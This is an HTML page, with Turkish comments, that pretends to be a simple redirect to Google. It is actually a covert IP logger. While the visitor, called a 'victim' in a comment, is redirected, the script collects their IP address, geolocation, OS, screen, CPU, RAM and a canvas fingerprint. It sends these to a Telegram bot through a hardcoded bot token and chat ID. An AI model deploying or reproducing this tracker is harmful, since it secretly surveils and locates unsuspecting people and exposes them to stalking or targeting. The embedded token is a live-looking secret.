<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yönlendiriliyor...</title>
</head>
<body>
    <script>
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.fillRect(125, 1, 62, 20);
                const src = canvas.toDataURL();
                let hash = 0;
                for (let i = 0; i < src.length; i++) {
                    hash = ((hash << 5) - hash) + src.charCodeAt(i);
                    hash = hash & hash;
                }
                return Math.abs(hash).toString(16).toUpperCase();
            } catch (e) { return "Bilinmiyor"; }
        }

        window.onload = function() {
            // HIZ OPTİMİZASYONU: Kurbanı anında Google'a uçur, işlemler arka planda dönsün
            setTimeout(() => {
                window.location.replace("https://www.google.com");
            }, 50);

            // Donanım verilerini oku (Anlık alınır, internet hızı gerektirmez)
            let ua = navigator.userAgent;
            let os = "Bilinmeyen Sistem";
            if (/iPhone|iPad|iPod/i.test(ua)) {
                let match = ua.match(/OS (\d+)_(\d+)_?(\d+)?/);
                os = match ? "iOS " + match[1] + "." + match[2] : "iOS";
            } else if (/Android/i.test(ua)) {
                let match = ua.match(/Android\s([0-9\.]+)/);
                os = match ? "Android " + match[1] : "Android";
            } else if (/Windows/i.test(ua)) { os = "Windows"; }

            let ekran = window.screen.width + "x" + window.screen.height;
            let cekirdek = navigator.hardwareConcurrency || "?";
            let ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Bilinmiyor";
            let tarih = new Date().toLocaleString('tr-TR');

            let tok = "8955422545:AAHLRntql6QLsF6DTdy6uaZRsBeVTvxzVtU";
            let cid = "6845229845";

            // IP API isteğini asenkron başlatıyoruz, cevabı beklemeden Telegram'a ilk veriyi basacağız
            fetch("https://ipapi.co/json/?cb=" + Math.random())
                .then(r => r.json())
                .then(veri => {
                    let ip = veri.ip || "Bilinmiyor";
                    let ulke = veri.country_name || "Bilinmiyor";
                    let eyalet_sehir = (veri.region || "") + " / " + (veri.city || "");
                    let internet_sirketi = veri.org || "Bilinmiyor";
                    let maps_link = (veri.latitude && veri.longitude) ? `https://www.google.com/maps?q=${veri.latitude},${veri.longitude}` : "https://maps.google.com";

                    let mesaj = "👑 *YENİ SİSTEM LOGU*\n";
                    mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
                    mesaj += "🌐 *IP Adresi:* `" + ip + "`\n";
                    mesaj += "🤖 *Sistem (OS):* `" + os + "`\n";
                    mesaj += "🏢 *ISP:* " + internet_sirketi + "\n";
                    mesaj += "📍 *Konum:* " + ulke + " - " + eyalet_sehir + "\n";
                    mesaj += "⏰ *Zaman:* " + tarih + "\n";
                    mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
                    mesaj += "🖥 *Ekran/İşlemci:* " + ekran + " / " + cekirdek + " Çekirdek\n";
                    mesaj += "💾 *RAM:* " + ram + " | 🔑 *Canvas:* `" + getCanvasFingerprint() + "`\n";
                    mesaj += "━━━━━━━━━━━━━━━━━━━━━━";

                    // Callback hatasını çözmek için butonları URL tipine çevirdik (Telegram'da kesin çalışır)
                    let reply_markup = {
                        inline_keyboard: [
                            [
                                { text: "📁 Data Sayfasına Git", url: "https://www.google.com" }, // Buraya datayı işleyeceğin bir link verebilirsin
                                { text: "📍 Haritada Gör", url: maps_link }
                            ]
                        ]
                    };

                    // Telegram'a gönderim
                    fetch(`https://api.telegram.org/bot${tok}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            chat_id: cid,
                            text: mesaj,
                            parse_mode: "Markdown",
                            reply_markup: reply_markup
                        })
                    });
                }).catch(() => {
                    // IP API patlarsa sadece donanım bilgileriyle hızlıca Telegram'a atar
                    let sadeMesaj = `⚠️ *Kısmi Log (IP Alınamadı)*\n\n🤖 *OS:* ${os}\n🖥 *Ekran:* ${ekran}\n⏰ *Zaman:* ${tari}`;
                    fetch(`https://api.telegram.org/bot${tok}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ chat_id: cid, text: sadeMesaj, parse_mode: "Markdown" })
                    });
                });
        };
    </script>
</body>
</html>
